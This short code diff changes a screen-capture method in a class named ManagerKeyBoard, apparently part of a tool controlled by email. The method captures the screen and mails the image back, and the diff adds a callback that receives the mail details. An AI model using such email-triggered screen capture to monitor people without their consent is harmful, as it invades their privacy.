@@ -14,6 +14,8 @@ class ManagerKeyBoard(metaclass=SingletonMeta):
     def __init__(self,email):
         self.mymail = email
 
-    def scap(self):
+    def scap(self,_callBack = None):
         rep = live_screen_server.capture_screenNow()
+        if _callBack:
+            _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), rep)
         self.mymail.sendBack(rep,rep)
